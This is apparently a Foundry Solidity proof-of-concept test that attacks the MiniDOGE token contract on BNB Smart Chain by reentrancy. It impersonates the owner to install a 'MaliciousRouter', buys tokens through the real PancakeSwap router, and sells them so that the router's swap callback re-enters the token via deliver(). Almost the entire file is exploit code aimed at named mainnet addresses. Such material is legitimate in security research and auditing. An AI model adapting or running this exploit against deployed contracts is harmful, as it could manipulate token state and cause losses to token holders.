pragma solidity ^0.8.4;

import "forge-std/Test.sol";

interface IMiniDOGE {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function changeRouterVersion(address _router) external returns (address);
    function deliver(uint256 tAmount) external;
    function totalFees() external view returns (uint256);
    function _rTotal() external view returns (uint256);
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
}

interface IUniswapV2Router {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract MaliciousRouter {
    IMiniDOGE public minidoge;
    // Events to track reentrancy
    bool public reentered;
    uint256 public reentrantAmount;

    constructor(address _minidoge) {
        minidoge = IMiniDOGE(_minidoge);
    }

    // Required by MiniDOGE
    function factory() external pure returns (address) {
        return address(0);
    }

    function WETH() external pure returns (address) {
        return 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB on BSC
    }

    // Called during buyBack: not needed for exploit, but stub
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256,
        address[] calldata,
        address,
        uint256
    ) external payable {
        // Do nothing
    }

    // Called during swapTokens (sell-to-contract swap)
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external {
        // Reenter into MiniDOGE via deliver
        // We deliver a small amount to change state
        reentered = true;
        reentrantAmount = 1e9;
        minidoge.deliver(reentrantAmount);
    }

    // Used by _getSellBnBAmount
    function getAmountsOut(uint256 amountIn, address[] calldata) external view returns (uint256[] memory result) {
        result = new uint256[](2);
        result[0] = amountIn;
        result[1] = 1e18; // dummy BNB amount
    }
}

contract ExploitTest is Test {
    address constant MINIDOGE = 0xba07eed3d09055d60caef2bdfca1c05792f2dfad;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    IMiniDOGE public token;
    IUniswapV2Router public router;
    MaliciousRouter public maliciousRouter;
    address public owner;
    address public attacker;
    IUniswapV2Factory public factory;

    function setUp() public {
        token = IMiniDOGE(MINIDOGE);
        router = IUniswapV2Router(ROUTER);
        factory = IUniswapV2Factory(FACTORY);
        owner = token.owner();
        attacker = address(this); // use test contract as attacker

        // Label for debugging
        vm.label(MINIDOGE, "MiniDOGE");
        vm.label(ROUTER, "PancakeRouter");
        vm.label(owner, "Owner");
        vm.label(attacker, "Attacker");

        // Give attacker some BNB for buying tokens
        deal(attacker, 10 ether);
    }

    function testReentrancyAttack() public {
        // Step 1: Impersonate owner to set malicious router and enable swaps
        vm.startPrank(owner);
        
        // Deploy malicious router
        maliciousRouter = new MaliciousRouter(MINIDOGE);
        // Change router to malicious one
        address pair = token.changeRouterVersion(address(maliciousRouter));
        // Enable swapAndLiquifyEnabled
        token.setSwapAndLiquifyEnabled(true);
        vm.stopPrank();

        // Step 2: Buy some MiniDOGE tokens for attacker using real PancakeSwap router
        // We'll swap ETH for tokens directly via the real router (still functional)
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = MINIDOGE;
        uint256 ethAmount = 1 ether;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            0,
            path,
            attacker,
            block.timestamp + 300
        );

        // Verify attacker has tokens
        uint256 attackerBalance = token.balanceOf(attacker);
        require(attackerBalance > 0, "No tokens bought");
        emit log_named_uint("Attacker token balance before exploit", attackerBalance);

        // Step 3: Get the MiniDOGE/BNB pair address (current pair after router change is same because we used same token pair)
        address pairAddr = token.uniswapV2Pair();

        // Step 4: Attacker sells tokens to the pair -> this triggers the contract's internal swap
        // The contract will call swapExactTokensForETHSupportingFeeOnTransferTokens on the malicious router
        // which will reenter via deliver
        uint256 sellAmount = attackerBalance / 2;
        token.approve(address(router), sellAmount); // not needed, but for safety
        // Transfer tokens to the pair to simulate a sell
        token.transfer(pairAddr, sellAmount);

        // Step 5: Verify reentrancy occurred
        assertTrue(maliciousRouter.reentered(), "Reentrancy did not happen");
        emit log_named_uint("Reentrant deliver amount", maliciousRouter.reentrantAmount());

        // Step 6: Check that deliver affected the reflection state (totalFees increased)
        uint256 totalFeesAfter = token.totalFees();
        emit log_named_uint("Total fees after exploit", totalFeesAfter);
        // Since deliver increases _tFeeTotal, totalFees should be > 0
        assertGt(totalFeesAfter, 0, "Deliver did not increase total fees");
    }

    receive() external payable {}
}
